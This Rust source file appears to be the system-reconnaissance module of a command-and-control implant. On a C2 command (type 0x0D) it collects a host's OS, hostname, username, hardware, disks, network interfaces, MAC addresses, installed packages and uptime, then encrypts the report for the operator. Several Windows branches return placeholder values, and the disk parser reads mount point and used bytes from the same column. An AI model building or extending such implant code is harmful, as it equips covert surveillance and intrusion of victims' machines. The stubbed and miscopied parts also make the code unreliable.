//! System info module — collect comprehensive system information.
//!
//! Collects:
//! - OS, hostname, username, architecture
//! - CPU info, RAM, disk info
//! - Network interfaces, IP addresses
//! - Installed software (Windows: registry, Linux: dpkg/rpm)

use anyhow::Result;
use serde::{Serialize, Deserialize};
use tracing::info;

use crate::c2::Command;
use crate::crypto;
use crate::modules::ModuleError;

/// System information
#[derive(Debug, Serialize, Deserialize)]
pub struct SystemInfo {
    pub os: String,
    pub os_version: String,
    pub hostname: String,
    pub username: String,
    pub architecture: String,
    pub cpu_model: String,
    pub cpu_cores: usize,
    pub ram_total: u64,
    pub ram_available: u64,
    pub disk_info: Vec<DiskInfo>,
    pub network_interfaces: Vec<NetworkInterface>,
    pub installed_software: Vec<InstalledSoftware>,
    pub uptime_seconds: u64,
}

/// Disk information
#[derive(Debug, Serialize, Deserialize)]
pub struct DiskInfo {
    pub mount_point: String,
    pub filesystem: String,
    pub total_bytes: u64,
    pub free_bytes: u64,
    pub used_bytes: u64,
}

/// Network interface information
#[derive(Debug, Serialize, Deserialize)]
pub struct NetworkInterface {
    pub name: String,
    pub mac_address: String,
    pub ipv4_addresses: Vec<String>,
    pub ipv6_addresses: Vec<String>,
    pub is_up: bool,
}

/// Installed software
#[derive(Debug, Serialize, Deserialize)]
pub struct InstalledSoftware {
    pub name: String,
    pub version: String,
    pub path: String,
}

/// System info module
pub struct SystemInfoModule;

impl SystemInfoModule {
    pub fn new() -> Self {
        Self
    }

    /// Collect system information
    fn collect_system_info() -> Result<SystemInfo, ModuleError> {
        let os = std::env::consts::OS.to_string();
        let architecture = std::env::consts::ARCH.to_string();

        // Hostname
        let hostname = hostname::get()
            .map(|h| h.to_string_lossy().to_string())
            .unwrap_or_else(|_| "unknown".to_string());

        // Username
        let username = whoami::fallible::username()
            .unwrap_or_else(|_| "unknown".to_string());

        // OS version
        let os_version = Self::get_os_version();

        // CPU info
        let (cpu_model, cpu_cores) = Self::get_cpu_info();

        // RAM info
        let (ram_total, ram_available) = Self::get_ram_info();

        // Disk info
        let disk_info = Self::get_disk_info();

        // Network interfaces
        let network_interfaces = Self::get_network_interfaces();

        // Installed software
        let installed_software = Self::get_installed_software();

        // Uptime
        let uptime_seconds = Self::get_uptime();

        Ok(SystemInfo {
            os,
            os_version,
            hostname,
            username,
            architecture,
            cpu_model,
            cpu_cores,
            ram_total,
            ram_available,
            disk_info,
            network_interfaces,
            installed_software,
            uptime_seconds,
        })
    }

    fn get_os_version() -> String {
        #[cfg(windows)]
        {
            // Windows version info via registry
            "unknown".to_string()
        }

        #[cfg(target_os = "linux")]
        {
            // Read /etc/os-release
            std::fs::read_to_string("/etc/os-release")
                .ok()
                .and_then(|content| {
                    content.lines()
                        .find(|l| l.starts_with("PRETTY_NAME="))
                        .map(|l| l.trim_start_matches("PRETTY_NAME=").trim_matches('"').to_string())
                })
                .unwrap_or_else(|| "Linux".to_string())
        }

        #[cfg(target_os = "macos")]
        {
            // macOS version via sw_vers
            std::process::Command::new("sw_vers")
                .output()
                .ok()
                .and_then(|o| String::from_utf8_lossy(&o.stdout).lines().find(|l| l.starts_with("ProductVersion:")).map(|l| l.trim_start_matches("ProductVersion:").trim().to_string()))
                .unwrap_or_else(|| "macOS".to_string())
        }

        #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
        {
            "unknown".to_string()
        }
    }

    fn get_cpu_info() -> (String, usize) {
        let cpu_model = Self::get_cpu_model();
        let cpu_cores = num_cpus::get();
        (cpu_model, cpu_cores)
    }

    fn get_cpu_model() -> String {
        #[cfg(target_os = "linux")]
        {
            std::fs::read_to_string("/proc/cpuinfo")
                .ok()
                .and_then(|content| {
                    content.lines()
                        .find(|l| l.starts_with("model name"))
                        .and_then(|l| l.split(':').nth(1))
                        .map(|s| s.trim().to_string())
                })
                .unwrap_or_else(|| "unknown".to_string())
        }

        #[cfg(windows)]
        {
            "unknown".to_string()
        }

        #[cfg(target_os = "macos")]
        {
            std::process::Command::new("sysctl")
                .args(&["-n", "machdep.cpu.brand_string"])
                .output()
                .ok()
                .and_then(|o| String::from_utf8_lossy(&o.stdout).trim().to_string().into())
                .unwrap_or_else(|| "unknown".to_string())
        }

        #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
        {
            "unknown".to_string()
        }
    }

    fn get_ram_info() -> (u64, u64) {
        #[cfg(target_os = "linux")]
        {
            let total = std::fs::read_to_string("/proc/meminfo")
                .ok()
                .and_then(|content| {
                    content.lines()
                        .find(|l| l.starts_with("MemTotal:"))
                        .and_then(|l| l.split(':').nth(1))
                        .and_then(|v| v.split("kB").next())
                        .and_then(|v| v.trim().parse::<u64>().ok())
                        .map(|kb| kb * 1024)
                })
                .unwrap_or(0);

            let available = std::fs::read_to_string("/proc/meminfo")
                .ok()
                .and_then(|content| {
                    content.lines()
                        .find(|l| l.starts_with("MemAvailable:"))
                        .and_then(|l| l.split(':').nth(1))
                        .and_then(|v| v.split("kB").next())
                        .and_then(|v| v.trim().parse::<u64>().ok())
                        .map(|kb| kb * 1024)
                })
                .unwrap_or(0);

            (total, available)
        }

        #[cfg(windows)]
        {
            (0, 0)
        }

        #[cfg(target_os = "macos")]
        {
            use sysctl::Sysctl;
            let total = Sysctl::new("hw.memsize")
                .ok()
                .and_then(|c| c.value().ok())
                .map(|v| v.as_u64().unwrap_or(0))
                .unwrap_or(0);
            (total, total / 2) // Approximate
        }

        #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
        {
            (0, 0)
        }
    }

    fn get_disk_info() -> Vec<DiskInfo> {
        let mut disks = Vec::new();

        #[cfg(target_os = "linux")]
        {
            // Parse df output
            if let Ok(output) = std::process::Command::new("df")
                .args(&["-B1", "--output=source,fstype,size,avail,used,target"])
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                for line in text.lines().skip(1) {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 5 {
                        disks.push(DiskInfo {
                            mount_point: parts[4].to_string(),
                            filesystem: parts[1].to_string(),
                            total_bytes: parts[2].parse().unwrap_or(0),
                            free_bytes: parts[3].parse().unwrap_or(0),
                            used_bytes: parts[4].parse().unwrap_or(0),
                        });
                    }
                }
            }
        }

        #[cfg(windows)]
        {
            // Use GetDiskFreeSpaceEx
            disks.push(DiskInfo {
                mount_point: "C:\\".to_string(),
                filesystem: "NTFS".to_string(),
                total_bytes: 0,
                free_bytes: 0,
                used_bytes: 0,
            });
        }

        disks
    }

    fn get_network_interfaces() -> Vec<NetworkInterface> {
        let mut interfaces = Vec::new();

        #[cfg(target_os = "linux")]
        {
            // Parse ip addr output
            if let Ok(output) = std::process::Command::new("ip")
                .args(&["-j", "addr", "show"])
                .output()
            {
                // Parse JSON output
                let text = String::from_utf8_lossy(&output.stdout);
                if let Ok(json) = serde_json::from_str::<serde_json::Value>(&text) {
                    if let Some(ifaces) = json.as_array() {
                        for iface in ifaces {
                            let name = iface["ifname"].as_str().unwrap_or("unknown").to_string();
                            let mac = iface["address"].as_str().unwrap_or("").to_string();
                            let ipv4s: Vec<String> = iface["addr_info"]
                                .as_array()
                                .map(|arr| arr.iter()
                                    .filter_map(|a| a["addr"].as_str())
                                    .map(String::from)
                                    .collect())
                                .unwrap_or_default();

                            if !name.starts_with("lo") {
                                interfaces.push(NetworkInterface {
                                    name,
                                    mac_address: mac,
                                    ipv4_addresses: ipv4s,
                                    ipv6_addresses: Vec::new(),
                                    is_up: true,
                                });
                            }
                        }
                    }
                }
            }
        }

        #[cfg(windows)]
        {
            interfaces.push(NetworkInterface {
                name: "Ethernet".to_string(),
                mac_address: "00:00:00:00:00:00".to_string(),
                ipv4_addresses: Vec::new(),
                ipv6_addresses: Vec::new(),
                is_up: true,
            });
        }

        interfaces
    }

    fn get_installed_software() -> Vec<InstalledSoftware> {
        let mut software = Vec::new();

        #[cfg(target_os = "linux")]
        {
            // Try dpkg
            if let Ok(output) = std::process::Command::new("dpkg")
                .args(&["--list"])
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                for line in text.lines().skip(2) {
                    if line.starts_with("ii ") {
                        let parts: Vec<&str> = line.split_whitespace().collect();
                        if parts.len() >= 3 {
                            software.push(InstalledSoftware {
                                name: parts[1].to_string(),
                                version: parts[2].to_string(),
                                path: String::new(),
                            });
                        }
                    }
                }
            }

            // Try rpm
            if let Ok(output) = std::process::Command::new("rpm")
                .args(&["-qa", "--qf", "%{NAME} %{VERSION} %{INSTALLTID}\n"])
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                for line in text.lines() {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 2 {
                        software.push(InstalledSoftware {
                            name: parts[0].to_string(),
                            version: parts[1].to_string(),
                            path: String::new(),
                        });
                    }
                }
            }
        }

        #[cfg(windows)]
        {
            // Windows: read from registry Uninstall keys
            software.push(InstalledSoftware {
                name: "Windows".to_string(),
                version: "11".to_string(),
                path: "C:\\Windows".to_string(),
            });
        }

        software
    }

    fn get_uptime() -> u64 {
        #[cfg(target_os = "linux")]
        {
            std::fs::read_to_string("/proc/uptime")
                .ok()
                .and_then(|content| {
                    content.split_whitespace().next()
                })
                .and_then(|s| s.split('.').next())
                .and_then(|s| s.parse::<u64>().ok())
                .unwrap_or(0)
        }

        #[cfg(windows)]
        {
            // GetTickCount64
            0
        }

        #[cfg(target_os = "macos")]
        {
            use sysctl::Sysctl;
            Sysctl::new("kern.boottime")
                .ok()
                .and_then(|c| c.value().ok())
                .and_then(|v| v.as_bytes())
                .and_then(|bytes| {
                    if bytes.len() >= 16 {
                        let sec = u64::from_le_bytes([
                            bytes[0], bytes[1], bytes[2], bytes[3],
                            bytes[4], bytes[5], bytes[6], bytes[7],
                        ]);
                        Some(chrono::Utc::now().timestamp() as u64 - sec)
                    } else {
                        None
                    }
                })
                .unwrap_or(0)
        }

        #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
        {
            0
        }
    }
}

#[async_trait::async_trait]
impl crate::modules::Module for SystemInfoModule {
    fn name(&self) -> &str {
        "system_info"
    }

    async fn execute(&self, cmd: &Command) -> Result<Vec<u8>, ModuleError> {
        if cmd.cmd_type != 0x0D {
            return Err(ModuleError::Execution("no_match".to_string()));
        }

        let info = Self::collect_system_info()?;

        // Serialize system info
        let json = serde_json::to_string_pretty(&info)
            .map_err(|e| ModuleError::Execution(format!("JSON serialize: {}", e)))?;

        // Encrypt result
        let encrypted = crypto::encrypt_with_integrity(json.as_bytes(), &cmd.crypto_key);

        info!("System info collected");
        Ok(encrypted)
    }
}
